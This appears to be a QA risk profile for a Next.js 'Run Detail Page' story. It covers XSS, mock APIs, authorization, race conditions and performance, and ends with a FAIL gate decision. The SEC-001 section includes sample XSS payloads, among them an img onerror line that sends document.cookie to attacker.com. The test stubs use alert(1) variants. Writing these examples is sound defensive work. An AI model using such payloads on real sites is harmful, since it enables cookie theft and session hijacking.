# Risk Profile: Story 7.3 - Run Detail Page with Tabs

**Date:** 2025-10-22
**Reviewer:** Quinn (Test Architect)
**Story ID:** 7.3
**Story Title:** Run Detail Page with Tabs

---

## Executive Summary

- **Total Risks Identified:** 12
- **Critical Risks (Score 9):** 2
- **High Risks (Score 6):** 3
- **Medium Risks (Score 4):** 5
- **Low Risks (Score 2-3):** 2
- **Overall Risk Score:** 33/100 (HIGH RISK - requires mitigation)

**Critical Finding:** This story has **2 critical security vulnerabilities** and **significant data integrity risks** due to mock API implementation with no real Prisma integration. The optimistic UI pattern without proper error recovery poses data consistency concerns.

---

## Critical Risks Requiring Immediate Attention

### 1. SEC-001: XSS Vulnerability in Markdown Rendering

**Score: 9 (Critical)**
**Probability:** High (3) - User-generated content rendered without sanitization
**Impact:** High (3) - Complete account compromise, data theft, session hijacking

**Description:**
ReactMarkdown renders opportunity card content and stage outputs without explicit sanitization. While `react-markdown` has built-in XSS protection, the `remarkGfm` plugin can introduce vulnerabilities through HTML in markdown. No Content Security Policy (CSP) headers detected.

**Affected Components:**
- `RunDetailOpportunityCards.tsx` (lines 73, 125-127)
- `RunDetailFullReport.tsx` (lines 75-77, 91-93, 125-127)
- All markdown rendering instances

**Attack Vector:**
```markdown
[Click me](javascript:alert(document.cookie))
<img src=x onerror="fetch('https://attacker.com?cookie='+document.cookie)">
```

**Mitigation Required:**
1. **IMMEDIATE:** Add `allowedElements` whitelist to ReactMarkdown
2. **IMMEDIATE:** Implement CSP headers in Next.js middleware
3. Add `rehype-sanitize` plugin for additional HTML sanitization
4. Validate and sanitize all markdown content before storage
5. Implement output encoding for user-supplied data

**Testing Focus:**
- Penetration testing with OWASP ZAP
- Manual XSS payload testing in card content
- Verify CSP blocks inline scripts
- Test with malicious markdown from various sources

**Residual Risk:** Medium - Zero-day vulnerabilities may exist in markdown parser

---

### 2. DATA-001: Mock API with No Real Database Integration

**Score: 9 (Critical)**
**Probability:** High (3) - All API endpoints return mock data
**Impact:** High (3) - Complete data loss, no persistence, production failure

**Description:**
All API routes (`/api/runs/[runId]`, `/api/cards/[cardId]/star`) use mock data with commented-out Prisma queries. The star toggle endpoint doesn't actually read current state before toggling, causing data inconsistency.

**Affected Components:**
- `innovation-web/app/api/runs/[runId]/route.ts` (lines 23-372)
- `innovation-web/app/api/cards/[cardId]/star/route.ts` (lines 23-46)

**Evidence:**
```typescript
// Lines 23-31 in route.ts - ALL database code is commented
// TODO: Replace with actual Prisma query
// const run = await prisma.pipelineRun.findUnique({...})

// Line 44 in star/route.ts - Hardcoded return value
isStarred: true, // In real implementation, toggle the current value
```

**Consequences:**
- ✗ No data persistence between sessions
- ✗ Star toggle always returns `true` regardless of current state
- ✗ Delete operation has no effect on actual data
- ✗ Unauthorized access not prevented (userId check bypassed)
- ✗ Production deployment will fail immediately

**Mitigation Required:**
1. **BLOCK PRODUCTION:** Cannot deploy without real Prisma integration
2. **IMMEDIATE:** Implement all Prisma queries as specified in story
3. Implement proper authorization checks (verify userId matches run.userId)
4. Add database transaction support for star toggle
5. Implement cascade delete for related records
6. Add database migration files

**Testing Focus:**
- Database integration tests with test Prisma instance
- Authorization bypass testing
- Concurrent star toggle race condition testing
- Delete cascade verification
- Data persistence verification across sessions

**Residual Risk:** Medium - Database migration risks, schema evolution issues

---

## High-Risk Issues

### 3. SEC-002: Missing Authorization on Delete Endpoint

**Score: 6 (High)**
**Probability:** Medium (2) - Auth check exists but mock data bypasses it
**Impact:** High (3) - Unauthorized deletion of user data

**Description:**
DELETE endpoint has auth check but mock implementation always succeeds. No verification that userId matches run owner. The route returns success even if Prisma delete fails (line 423).

**Mitigation:**
- Verify run.userId === auth().userId before deletion
- Return 403 Forbidden for unauthorized attempts
- Implement audit logging for delete operations
- Add soft delete option to prevent accidental data loss

---

### 4. PERF-001: No Pagination or Query Limits on Related Data

**Score: 6 (High)**
**Probability:** Medium (2) - Becomes likely as data grows
**Impact:** High (3) - Database overload, slow page loads, timeouts

**Description:**
Prisma query includes all opportunityCards, stageOutputs without limits. A run with 1000+ cards will crash the page.

**Affected Code:**
```typescript
include: {
  opportunityCards: { orderBy: { number: 'asc' } }, // No limit!
  stageOutputs: { orderBy: { stageNumber: 'asc' } }
}
```

**Mitigation:**
- Add `take: 100` limit to related queries
- Implement pagination for cards if count > 50
- Add database indexes on frequently queried fields
- Implement lazy loading for tab content

---

### 5. DATA-002: Race Condition in Star Toggle with Optimistic Update

**Score: 6 (High)**
**Probability:** Medium (2) - Likely with slow networks or multiple tabs
**Impact:** High (3) - Data corruption, inconsistent state

**Description:**
Optimistic update happens before API confirmation (lines 267-275). If API call fails or user has multiple tabs open, starred state becomes inconsistent. No retry logic or rollback mechanism.

**Attack Scenario:**
1. User opens run in 2 tabs
2. Tab A: Click star (optimistic: starred=true)
3. Tab B: Click star (optimistic: starred=true)
4. API returns failure for Tab A
5. Result: UI shows starred in both tabs, but database state unknown

**Mitigation:**
- Implement version-based optimistic locking
- Add rollback logic if API call fails
- Use WebSocket or polling for cross-tab state sync
- Show loading state during API call
- Add retry mechanism with exponential backoff

---

## Medium-Risk Issues

### 6. TECH-001: Client Component with Async Params (Next.js 15 Breaking Change)

**Score: 4 (Medium)**
**Probability:** Medium (2) - Next.js 15 async params pattern used
**Impact:** Medium (2) - Runtime errors, deployment issues

**Description:**
Page component uses `params: Promise<{ runId: string }>` pattern (line 73) but implements manual unwrapping with `useEffect` instead of React.use() or async Server Component pattern.

**Issue:**
```typescript
// Current approach - works but non-idiomatic
const [runId, setRunId] = useState<string | null>(null)
useEffect(() => {
  params.then((p) => setRunId(p.runId))
}, [params])
```

**Mitigation:**
- Convert to Server Component for data fetching
- Use React.use() for params in Client Component
- Add error boundary for params resolution failures

---

### 7. SEC-003: PDF Generation with Untrusted Content

**Score: 4 (Medium)**
**Probability:** Medium (2) - If markdown contains malicious content
**Impact:** Medium (2) - PDF injection attacks, file-based XSS

**Description:**
jsPDF directly embeds card.content without sanitization (lines 233-235). Malicious markdown could inject PDF objects or JavaScript into PDF metadata.

**Mitigation:**
- Strip all markdown formatting before PDF generation
- Use plain text only in PDF output
- Sanitize card titles and content
- Implement PDF content validation

---

### 8. PERF-002: Polling Every 5 Seconds Without Backoff

**Score: 4 (Medium)**
**Probability:** Medium (2) - Every processing run polls continuously
**Impact:** Medium (2) - Server overload, bandwidth waste, battery drain

**Description:**
Polling interval is fixed at 5 seconds (line 144) with no exponential backoff or maximum attempts. Long-running pipelines could poll for hours.

**Mitigation:**
- Implement exponential backoff (5s → 10s → 30s → 60s)
- Add maximum polling duration (15 minutes)
- Use WebSocket for real-time updates instead
- Add network error handling in polling

---

### 9. OPS-001: No Error Logging or Monitoring

**Score: 4 (Medium)**
**Probability:** High (3) - No logging infrastructure visible
**Impact:** Low (1) - Difficult debugging, poor observability

**Description:**
All error handling uses `console.error` and `alert()` (lines 116, 172, 195, 241, 278). No structured logging, no error tracking service integration.

**Mitigation:**
- Integrate Sentry or similar error tracking
- Add structured logging with context (userId, runId, timestamp)
- Implement error boundaries with reporting
- Add performance monitoring for API calls

---

### 10. TECH-002: JSON.parse Without Error Handling

**Score: 4 (Medium)**
**Probability:** Medium (2) - If stage.output contains invalid JSON
**Impact:** Medium (2) - Page crash, poor UX

**Description:**
`RunDetailPipelineStages.tsx` parses JSON without try-catch (line 146):

```typescript
JSON.stringify(JSON.parse(stage.output), null, 2)
```

If `stage.output` is malformed JSON, this crashes the component.

**Mitigation:**
- Add try-catch around JSON.parse
- Display raw output if JSON parsing fails
- Validate JSON structure in API response
- Add error boundary around component

---

### 11. BUS-001: No Offline Support or Connection Error Handling

**Score: 4 (Medium)**
**Probability:** Medium (2) - Mobile users, poor connectivity
**Impact:** Medium (2) - Poor UX, lost user actions

**Description:**
No offline detection, no service worker, no cache strategy. Users lose all state if connection drops during polling or star toggle.

**Mitigation:**
- Add connection state detection
- Implement request queuing for offline actions
- Add service worker for caching static assets
- Show connection status indicator

---

## Low-Risk Issues

### 12. TECH-003: Missing TypeScript Strict Mode Checks

**Score: 3 (Low)**
**Probability:** Low (1) - TypeScript catches most issues
**Impact:** High (3) - Runtime type errors possible

**Description:**
Several components have optional chaining that could be avoided with proper type guards. Potential runtime errors if data shape changes.

**Mitigation:**
- Enable strict null checks in tsconfig.json
- Add runtime type validation with Zod
- Implement API response schema validation

---

### 13. OPS-002: No Performance Budgets or Monitoring

**Score: 2 (Low)**
**Probability:** Low (1) - Performance seems acceptable in testing
**Impact:** Medium (2) - Poor UX at scale

**Description:**
No Core Web Vitals monitoring, no performance budgets, no lazy loading of heavy components (jsPDF imports 1MB+ library).

**Mitigation:**
- Implement dynamic imports for jsPDF
- Add Web Vitals reporting
- Set performance budgets in bundle config
- Lazy load tab content

---

## Risk Distribution

### By Category
| Category | Total | Critical | High | Medium | Low |
|----------|-------|----------|------|--------|-----|
| Security (SEC) | 3 | 1 | 1 | 1 | 0 |
| Data (DATA) | 2 | 1 | 1 | 0 | 0 |
| Performance (PERF) | 2 | 0 | 1 | 1 | 0 |
| Technical (TECH) | 3 | 0 | 0 | 2 | 1 |
| Operational (OPS) | 2 | 0 | 0 | 1 | 1 |
| Business (BUS) | 1 | 0 | 0 | 1 | 0 |

### By Component
| Component | Risk Count | Highest Risk |
|-----------|------------|--------------|
| API Routes | 4 | Critical (DATA-001) |
| Markdown Rendering | 2 | Critical (SEC-001) |
| Star Toggle Logic | 2 | High (DATA-002) |
| PDF Generation | 1 | Medium (SEC-003) |
| Polling Mechanism | 1 | Medium (PERF-002) |
| Error Handling | 2 | Medium (OPS-001) |

---

## Risk-Based Testing Strategy

### Priority 1: Critical Risk Tests (MUST PASS)

**SEC-001 XSS Testing:**
```typescript
describe('Markdown XSS Protection', () => {
  it('should block javascript: URLs', () => {
    const maliciousCard = {
      content: '[Click](javascript:alert(1))'
    }
    // Verify link is sanitized or blocked
  })

  it('should sanitize HTML in markdown', () => {
    const maliciousCard = {
      content: '<img src=x onerror="alert(1)">'
    }
    // Verify script execution blocked
  })
})
```

**DATA-001 Database Integration:**
```typescript
describe('Prisma Integration', () => {
  it('should persist star toggle to database', async () => {
    // Toggle star
    // Verify database record updated
    // Verify correct state returned
  })

  it('should enforce authorization on run access', async () => {
    // Attempt to access another user's run
    // Verify 404 returned
  })
})
```

### Priority 2: High Risk Tests

**DATA-002 Race Conditions:**
```typescript
describe('Star Toggle Concurrency', () => {
  it('should handle rapid successive toggles', async () => {
    // Click star 10 times rapidly
    // Verify final state is consistent
  })

  it('should rollback optimistic update on API failure', async () => {
    // Mock API failure
    // Verify UI reverts to previous state
  })
})
```

**PERF-001 Large Dataset Handling:**
```typescript
describe('Performance with Large Datasets', () => {
  it('should load page with 100+ cards in <3 seconds', async () => {
    // Create run with 150 cards
    // Measure page load time
  })

  it('should paginate cards if count > 50', async () => {
    // Verify pagination UI appears
    // Verify only 50 cards initially rendered
  })
})
```

### Priority 3: Medium/Low Risk Tests

- Tab navigation with URL state persistence
- PDF generation with various content lengths
- Polling behavior during long-running processes
- Mobile responsive layout verification
- Error boundary testing

---

## Must Fix Before Production

### Blockers (Gate = FAIL)

1. **SEC-001:** Implement markdown sanitization + CSP headers
2. **DATA-001:** Replace all mock APIs with real Prisma queries
3. **SEC-002:** Implement proper authorization checks on all endpoints
4. **DATA-002:** Add rollback mechanism for optimistic updates

**Estimated Effort:** 8-12 hours

### High Priority (Gate = CONCERNS)

5. **PERF-001:** Add pagination/limits to Prisma queries
6. **TECH-001:** Convert to proper Next.js 15 pattern or use React.use()
7. **SEC-003:** Sanitize content before PDF generation
8. **PERF-002:** Implement exponential backoff in polling

**Estimated Effort:** 4-6 hours

---

## Can Deploy with Monitoring

- **TECH-002:** JSON.parse error handling (add try-catch)
- **OPS-001:** Error logging infrastructure (can be added post-launch)
- **BUS-001:** Offline support (nice-to-have)
- **OPS-002:** Performance monitoring (can be incremental)

---

## Accepted Risks

None at this time. All critical and high risks must be addressed before production deployment.

---

## Monitoring Requirements

### Post-Deployment Monitoring

**Security Alerts:**
- Alert on suspicious markdown content patterns
- Monitor for CSP violation reports
- Track failed authorization attempts

**Performance Metrics:**
- Page load time (target: <2s)
- API response time (target: <500ms)
- Polling frequency and duration
- PDF generation time

**Error Rates:**
- API error rate (target: <1%)
- Star toggle failure rate
- Database query failures
- JSON parse errors

**Business KPIs:**
- Run view rate
- Star toggle usage
- PDF download rate
- Tab interaction patterns

---

## Risk Review Triggers

Re-assess risk profile when:
- Prisma integration completed
- CSP headers added
- New markdown plugins added
- Performance issues reported
- Security vulnerabilities discovered in dependencies

---

## Integration with Quality Gate

**Deterministic Gate Decision:**

- **Any risk score ≥ 9:** Gate = **FAIL** (2 critical risks present)
- **Any risk score ≥ 6:** Gate = **CONCERNS** (3 high risks present)
- **Unmitigated critical risks:** 2 (SEC-001, DATA-001)

### **GATE DECISION: FAIL** ❌

**Justification:** Story has 2 critical security/data risks that pose immediate production danger. Must address SEC-001 (XSS) and DATA-001 (mock APIs) before deployment.

---

**File Location:** `docs/qa/assessments/7.3-run-detail-page-tabs-risk-20251022.md`
